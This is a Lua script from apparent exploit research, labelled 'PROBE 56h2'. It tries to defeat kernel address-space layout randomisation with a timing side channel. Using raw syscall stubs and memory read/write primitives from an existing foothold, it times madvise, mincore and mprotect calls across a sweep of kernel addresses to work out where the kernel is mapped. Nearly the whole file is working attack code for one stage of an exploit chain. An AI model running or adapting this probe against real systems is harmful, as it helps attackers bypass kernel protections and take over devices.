-- CRASH_CLASS: LOW
-- PROBE 56h2: Timing-based KASLR defeat via clock_gettime
--
-- We can't execute RDTSC directly (no clean rdtsc;ret gadget + W^X).
-- But clock_gettime(232) gives nanosecond resolution.
-- If mincore/madvise/mprotect on different kernel addresses takes
-- measurably different time depending on whether the kernel has
-- page table entries at that address, we can distinguish mapped
-- from unmapped kernel regions → binary search for kernel base.
--
-- Strategy: call clock_gettime before and after a target syscall,
-- repeat N times to get statistical significance. Compare timing
-- distributions for different kernel address regions.

print("=== PROBE 56h2: TIMING KASLR ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- clock_gettime: syscall 232
-- CLOCK_MONOTONIC = 4
local sc_clock = mk(232)
local ts = memory.alloc(16)

local function get_nsec()
    wq(ts, uint64(0))
    wq(uint64(N(ts) + 8), uint64(0))
    sc_clock(uint64(4), uint64(N(ts)))  -- CLOCK_MONOTONIC
    local sec = rd(N(ts))
    local nsec = rd(N(ts) + 8)
    if not sec or not nsec then return 0 end
    return sec * 1000000000 + nsec
end

-- Verify clock works
local t1 = get_nsec()
local t2 = get_nsec()
local t3 = get_nsec()
print(string.format("clock test: %d → %d → %d (delta: %d, %d ns)",
    t1, t2, t3, t2 - t1, t3 - t2))

if t2 <= t1 or t3 <= t2 then
    print("WARNING: clock not monotonic or resolution too low")
end

-- ============ SECTION A: Measure clock_gettime overhead ============
print("")
print("--- SECTION A: clock overhead (100 samples) ---")

local overhead = {}
for i = 1, 100 do
    local a = get_nsec()
    local b = get_nsec()
    overhead[i] = b - a
end
table.sort(overhead)
print(string.format("  min=%d median=%d max=%d ns",
    overhead[1], overhead[50], overhead[100]))

-- ============ SECTION B: Time madvise on different address ranges ============
-- madvise showed delta=1 for userland, delta=0 for kernel in 56f
-- Does the TIMING differ between kernel addresses?
print("")
print("--- SECTION B: madvise timing (50 samples per address) ---")

local sc_madvise = mk(75)
local SAMPLES = 50

local test_addrs = {
    {name = "unmapped_user",   hi = 0x00000001, lo = 0x00000000},
    {name = "kernel_low",      hi = 0xFFFF8000, lo = 0x00000000},
    {name = "kernel_0x20",     hi = 0xFFFF8020, lo = 0x00000000},
    {name = "kernel_0x40",     hi = 0xFFFF8040, lo = 0x00000000},
    {name = "kernel_0x80",     hi = 0xFFFF8080, lo = 0x00000000},
    {name = "kernel_0x100",    hi = 0xFFFF8100, lo = 0x00000000},
    {name = "kernel_0x200",    hi = 0xFFFF8200, lo = 0x00000000},
    {name = "kernel_0x400",    hi = 0xFFFF8400, lo = 0x00000000},
    {name = "kernel_0x800",    hi = 0xFFFF8800, lo = 0x00000000},
    {name = "kernel_0xF800",   hi = 0xFFFFF800, lo = 0x00000000},
    {name = "kernel_0xFF00",   hi = 0xFFFFFF00, lo = 0x00000000},
}

for _, t in ipairs(test_addrs) do
    local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))
    local times = {}
    for i = 1, SAMPLES do
        local a = get_nsec()
        pcall(function() sc_madvise(addr, uint64(0x4000), uint64(0)) end)
        local b = get_nsec()
        times[i] = b - a
    end
    table.sort(times)
    local sum = 0
    for i = 1, SAMPLES do sum = sum + times[i] end
    print(string.format("  %-18s min=%5d med=%5d avg=%5d max=%5d ns",
        t.name, times[1], times[math.floor(SAMPLES/2)], math.floor(sum/SAMPLES), times[SAMPLES]))
end

-- ============ SECTION C: Time mincore on different address ranges ============
print("")
print("--- SECTION C: mincore timing (50 samples per address) ---")

local sc_mincore = mk(78)
local vec = memory.alloc(256)

for _, t in ipairs(test_addrs) do
    local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))
    local times = {}
    for i = 1, SAMPLES do
        local a = get_nsec()
        pcall(function() sc_mincore(addr, uint64(0x4000), uint64(N(vec))) end)
        local b = get_nsec()
        times[i] = b - a
    end
    table.sort(times)
    local sum = 0
    for i = 1, SAMPLES do sum = sum + times[i] end
    print(string.format("  %-18s min=%5d med=%5d avg=%5d max=%5d ns",
        t.name, times[1], times[math.floor(SAMPLES/2)], math.floor(sum/SAMPLES), times[SAMPLES]))
end

-- ============ SECTION D: Time mprotect on kernel addresses ============
-- mprotect returned ret=0 on kernel addresses! That's weird.
-- Does the timing differ based on whether there's a page table walk?
print("")
print("--- SECTION D: mprotect timing (50 samples per address) ---")

local sc_mprot = mk(74)

-- Focus on kernel addresses only, finer granularity
local kern_addrs = {
    {name = "kern_8000_0",     hi = 0xFFFF8000, lo = 0x00000000},
    {name = "kern_8000_1M",    hi = 0xFFFF8000, lo = 0x00100000},
    {name = "kern_8000_10M",   hi = 0xFFFF8000, lo = 0x01000000},
    {name = "kern_8000_100M",  hi = 0xFFFF8000, lo = 0x10000000},
    {name = "kern_8001_0",     hi = 0xFFFF8001, lo = 0x00000000},
    {name = "kern_8010_0",     hi = 0xFFFF8010, lo = 0x00000000},
    {name = "kern_8100_0",     hi = 0xFFFF8100, lo = 0x00000000},
    {name = "kern_F800_0",     hi = 0xFFFFF800, lo = 0x00000000},
    {name = "kern_FF80_0",     hi = 0xFFFFFF80, lo = 0x00000000},
    {name = "kern_FFFF_0",     hi = 0xFFFFFFFF, lo = 0x00000000},
}

for _, t in ipairs(kern_addrs) do
    local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))
    local times = {}
    for i = 1, SAMPLES do
        local a = get_nsec()
        pcall(function() sc_mprot(addr, uint64(0x4000), uint64(1)) end)
        local b = get_nsec()
        times[i] = b - a
    end
    table.sort(times)
    local sum = 0
    for i = 1, SAMPLES do sum = sum + times[i] end
    print(string.format("  %-18s min=%5d med=%5d avg=%5d max=%5d ns",
        t.name, times[1], times[math.floor(SAMPLES/2)], math.floor(sum/SAMPLES), times[SAMPLES]))
end

-- ============ DONE ============
print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56h2 COMPLETE ===")
